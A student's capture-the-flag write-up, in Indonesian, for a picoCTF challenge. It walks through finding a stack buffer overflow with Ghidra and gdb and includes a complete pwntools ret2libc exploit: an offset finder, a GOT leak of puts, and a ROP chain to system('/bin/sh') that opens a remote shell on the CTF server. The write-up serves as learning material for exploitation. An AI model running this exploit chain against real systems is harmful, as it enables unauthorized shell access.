Write Up Here a Libc

Nama: Fachry Altair Gantari Amaludin
NIM: 2602109366

Step pertama yang saya coba adalah dengan menjalankan program dengan connect ke remote server yang disediakan. 

<div align="center">
  <img src="https://github.com/user-attachments/assets/14bdca32-f80e-4890-bba7-7003b082a89b">
</div>
</br>

Dari foto di atas, saya mengetahui bahwa program ini merubah input text yang dimasukkan oleh user menjadi uppercase di huruf yang ganjil dan lowercase di huruf yang genap.

Lalu, saya mencoba untuk membuka program dengan Ghidra. Pada fungsi main, saya mengetahui bahwa dia memanggil fungsi do_stuff() yang disimpan dalam do while.

<div align="center">
  <img src="https://github.com/user-attachments/assets/95b39820-4de7-47ac-b831-de0a515656be">
</div>
</br>

Berikut adalah fungsi do_stuff():

<div align="center">
  <img src="https://github.com/user-attachments/assets/b38a0f05-93f1-4229-a819-50d661c9cafd">
</div>
</br>

Berdasarkan decompiled code fungsi do_stuff(), ada kemungkinan buffer overflow pada fungsi scanf pertama yang ini adalah input dari user dengan buffer 112 dari local_88. Lalu, pada for loop, huruf yang di convert_case hanya sampai < 100.

Saat saya mencoba input string random untuk mencoba buffer overflow, terjadi segmentation fault.

<div align="center">
  <img src="Screenshot 2024-11-28 021056](https://github.com/user-attachments/assets/c01e2b64-54ad-4c78-b61f-fb9b7ab44a79">
</div>
</br>

Selanjutnya saya mencoba untuk menjalankan di gdb dengan cara yang sama dengan foto di atas. Awalnya saya bingung karena sudah lebih banyak dari buffer (112) tapi nilai di rip belum berubah.

<div align="center">
  <img src="https://github.com/user-attachments/assets/e50750d4-2653-4911-b511-e9df98805054">
</div>
</br>

Karena saya skill issue dan bingung kenapa saat saya menggunakan gdb gef tidak berubah juga rip nya (mungkin payload nya salah atau kurang panjang) dan tidak menemukan offset, saya mencari write up di Youtube dan meminta bantuan ChatGPT. Berdasarkan GPT dan video di Youtube, saya akhirnya menggunakan pwntools cyclic untuk menemukan offset dari buffer overflow yang ingin dilakukan. Berikut code nya:

```python
from pwn import *

binary = './vuln'
elf = ELF(binary)
context.binary = binary

p = process(binary)

payload = cyclic(200)
p.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!', payload)

p.wait()
core = p.corefile

offset = cyclic_find(core.read(core.rsp, 4))
log.info(f"Offset found: {offset}")
```

Saya menjalankan scriptnya di kali linux karena di windows ternyata error dan harus di linux. Ini offsetnya:

<div align="center">
  <img src="https://github.com/user-attachments/assets/03b0e75b-3745-46fc-b81d-87cd27fa54e3">
</div>
</br>

Note: Saya ingin jujur ko, di step yang akan dijelaskan selanjutnya, saya mengikuti bantuan ChatGPT terutama dalam pembuatan script.

Selanjutnya, setelah mengetahui offset, saya mencari address dari fungsi-fungsi yang ada di libc. Tujuan akhir alamat yang ingin diambil adalah alamat fungsi system. Selain fungsi, string /bin/sh juga saya cari untuk menjalankan shell di remote server.

Saya dengan bantuan ChatGPT membuat script untuk eksploitasi.

```python
from pwn import *

# Konfigurasi Binary dan Libc
binary = './vuln_patched'  # Nama binary
libc_path = './libc.so.6'  # Nama file libc
elf = ELF(binary)
libc = ELF(libc_path)

# Alamat penting dari binary
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

# Offset dari buffer overflow
offset = 136

# Remote server
host = 'mercury.picoctf.net'
port = 49464

# Fungsi untuk leak alamat libc
def leak_libc_address(proc, func_got):
    log.info(f"Leaking {func_got} address...")
    rop = ROP(elf)
    rop.call(puts_plt, [func_got])  # Cetak alamat fungsi di GOT
    rop.call(main_addr)  # Kembali ke fungsi main untuk eksploitasi ulang
    
    payload = flat({offset: rop.chain()})
    proc.sendlineafter("WeLcOmE To mY EcHo sErVeR!", payload)
    leaked_address = u64(proc.recvline().strip().ljust(8, b'\x00'))
    log.success(f"Leaked {func_got} address: {hex(leaked_address)}")
    return leaked_address

# Fungsi eksploitasi untuk mendapatkan shell
def exploit(proc):
    # Leak libc puts address
    libc_puts = leak_libc_address(proc, puts_got)

    # Hitung base address libc
    libc_base = libc_puts - libc.symbols['puts']
    log.success(f"Libc base address: {hex(libc_base)}")

    # Hitung alamat "/bin/sh" dan system
    system_addr = libc_base + libc.symbols['system']
    bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

    log.info(f"System address: {hex(system_addr)}")
    log.info(f"/bin/sh address: {hex(bin_sh_addr)}")

    # ROP chain untuk mendapatkan shell
    rop = ROP(elf)
    rop.call(system_addr, [bin_sh_addr])

    payload = flat({offset: rop.chain()})
    proc.sendlineafter("WeLcOmE To mY EcHo sErVeR!", payload)

    # Berikan akses interaktif
    proc.interactive()

# Main program
if __name__ == "__main__":
    context.binary = elf
    p = remote(host, port)
    exploit(p)
```








